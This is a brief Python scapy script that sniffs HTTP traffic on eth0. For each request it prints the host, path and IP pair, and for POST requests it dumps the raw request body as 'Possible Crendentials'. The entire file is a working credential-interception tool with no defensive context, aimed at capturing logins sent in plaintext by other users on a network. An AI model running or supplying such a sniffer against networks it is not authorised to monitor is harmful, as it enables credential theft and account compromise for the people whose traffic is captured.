import sys, platform, argparse
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=Process_Packet)

def Process_Packet(packet):
    if packet.haslayer(http.HTTPRequest):
        print(packet.show())
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        ip_transfer = f'{packet[scapy.IP].src} -> {packet[scapy.IP].dst}'
        method = packet[http.HTTPRequest].Method.decode()
        if method == "POST":
            print(f'[>>>>] Informations & Credentials :\n[+] {url.decode()}\n[+] IPSrc -> IPdst : {ip_transfer}\n[+] Method : {method}')
            if packet.haslayer(scapy.Raw) and packet.haslayer(scapy.IP):
                load = packet[scapy.Raw].load
                print(f'[+] Possible Crendentials : {load.decode()}')
        if method == "GET":
            print(f'[>>>>] Informations & Credentials :\n[+] {url.decode()}\n[+] IPSrc -> IPdst : {ip_transfer}\n[+] Method : {method}')

sniff('eth0')